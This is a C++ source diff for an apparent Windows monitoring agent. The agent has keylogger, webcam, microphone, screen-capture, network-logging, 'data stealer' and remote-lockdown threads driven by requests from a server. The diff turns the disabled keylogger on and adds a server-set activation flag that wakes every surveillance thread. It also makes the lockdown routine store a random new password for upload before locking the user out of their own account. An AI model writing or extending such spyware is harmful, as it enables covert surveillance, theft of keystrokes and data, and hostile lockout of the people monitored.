@@ -1,11 +1,16 @@
 #include "TaskRoutines.h"
 #include "TasksHelper.h"
-
-HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, stealRequest, screenRequest, newDataEvent;
+#include <iostream>
+#include <fstream>  
+HANDLE activateEvent, camRequest, micRequest, lockRequest, passSent, cmdRequest, locationRequest, stealRequest, screenRequest, newDataEvent;
 map<string, map<string, string>> workingTasks;
+BOOL active = FALSE;
 
-DWORD WINAPI initFiltering(LPVOID lpParam)
+DWORD WINAPI initConfig(LPVOID lpParam)
 {
+	do {
+		activateEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("activate"));
+	} while (activateEvent == NULL);
 	while (TRUE) {
 		ResponseData deviceConfigs;
 		string additionalSites = "";
@@ -21,6 +26,26 @@ DWORD WINAPI initFiltering(LPVOID lpParam)
 		}
 		// Parse the retrieved json file
 		map<string, string> configs = itemFromJson(TRUE, deviceConfigs.response, DATA);
+
+		// Check if device is set to Active
+		if (configs.find(IS_ACTIVE) != configs.end()) 
+		{
+			if (configs.find(IS_ACTIVE)->second == "true")
+			{
+				// If it is, wake all sleeping threads
+				active = TRUE;
+				SetEvent(activateEvent);
+			}
+			else {
+				// Reset last event call so that all threads will go to sleep
+				ResetEvent(activateEvent);
+				// Set that device to non active ..
+				active = FALSE;
+				// Check active status in a hour again..
+				Sleep(SYNC_TIME);
+				continue;
+			}
+		}
 
 		wstring finalFilterPath = L"";
 		// Build the requested filter path according to the retrieved config file..
@@ -62,7 +87,7 @@ DWORD WINAPI initFiltering(LPVOID lpParam)
 
 						// If succeed, go to sleep for a hour, no need to check more frequently..
 						if (setFilters(finalFilterPath.c_str(), additionalSites.c_str()))
-							Sleep(SYNC_TIME * 60);
+							Sleep(LONG_SYNC_TIME);
 					}
 		// Sleep only 1 minute in case something went wrong.. Will also go to sleep this time if slept for a hour before
 		Sleep(SYNC_TIME);
@@ -73,6 +98,7 @@ DWORD WINAPI initFiltering(LPVOID lpParam)
 DWORD WINAPI initNetLogger(LPVOID lpParam)
 {
 	while (TRUE) {
+		checkActive();
 		// Get a new filename
 		wstring firstfilename = stringToWString(DATA_FOLDER_PATH).append(L"netlog");
 		// First create a list of ip outgoing addresses on port 443 (HTTPS) and 80 (HTTP)
@@ -117,7 +143,8 @@ DWORD WINAPI initNetLogger(LPVOID lpParam)
 
 DWORD WINAPI initKeylogger(LPVOID lpParam)
 {
-	while (FALSE) {
+	while (TRUE) {
+		checkActive();
 		QUERY_USER_NOTIFICATION_STATE pquns;
 		SHQueryUserNotificationState(&pquns);
 
@@ -240,6 +267,9 @@ DWORD WINAPI initMic(LPVOID lpParam)
 }
 DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
 {
+	// Initial seed for random methods
+	srand((unsigned)time(NULL) * getpid());
+
 	// Try to create the corresponding event
 	do {
 		lockRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("lock"));
@@ -254,10 +284,20 @@ DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
 
 		// Create a new password for the host 
 		char* newPassword = generateRandomPass();
-		// TODO: Send the new password to parent account
+
+		string filename = constructFilename(PASS_LOCK_CODE);
+		std::ofstream outfile(filename);
+		outfile << newPassword << std::endl;
+		outfile.close();
 
 		wchar_t wPassword[PASSWORD_LEN];
 		mbstowcs(wPassword, newPassword, strlen(newPassword) + 1);
+
+		WaitForSingleObject(
+			passSent, // event handle
+			INFINITE);    // indefinite wait
+		// Event was called
+		ResetEvent(passSent);
 
 		// Update the password and lock the current user out of his computer
 		BOOL success = lockUser(wPassword);
@@ -388,11 +428,17 @@ DWORD WINAPI initDataStealer(LPVOID lpParam)
 
 DWORD WINAPI initDataManager(LPVOID lpParam)
 {
-	// Try to create the corresponding event
+	// Try to create the corresponding events
+
+	do {
+		passSent = CreateEvent(NULL, TRUE, FALSE, TEXT("pass"));
+	} while (passSent == NULL);
+
 	do {
 		newDataEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("data"));
 	} while (newDataEvent == NULL);
 	while (TRUE) {
+		checkActive();
 		WaitForSingleObject(
 			newDataEvent, // event handle
 			0);    // indefinite wait
@@ -445,6 +491,10 @@ DWORD WINAPI initDataManager(LPVOID lpParam)
 				Sleep(SYNC_TIME);
 			}
 
+			if (dataType == Lockdown) {
+				SetEvent(passSent);
+			}
+
 			wstring wfilename(currentData.cFileName);
 			wstring concatted_stdstr = L"temp/" + wfilename;
 			LPCWSTR fullPath = concatted_stdstr.c_str();
@@ -462,12 +512,14 @@ DWORD WINAPI initDataManager(LPVOID lpParam)
 	return 0;
 }
 
+
 DWORD WINAPI initRequestManager(LPVOID lpParam)
 {
 	while (TRUE) {
+		checkActive();
 		// Look for new requests from server.. 
 		ResponseData requests;
-
+		
 		while (TRUE) {
 			// Get all requests from the server..
 			requests = downloadFile(REQUESTS);
@@ -534,4 +586,20 @@ BOOL initRequest(map<string, map<string, string>> allRequests, const char* reque
 		return TRUE;
 	}
 	return FALSE;
+}
+
+
+DWORD WINAPI checkActive()
+{
+	// Go to sleep only in case of non active flag,
+	// and wait for a wake event.
+	while (activateEvent == NULL) 
+		Sleep(5000);
+	if (!active) {
+		WaitForSingleObject(
+			activateEvent, // event handle
+			INFINITE);    // indefinite wait
+		// Event was called
+	}
+	return 0;
 }
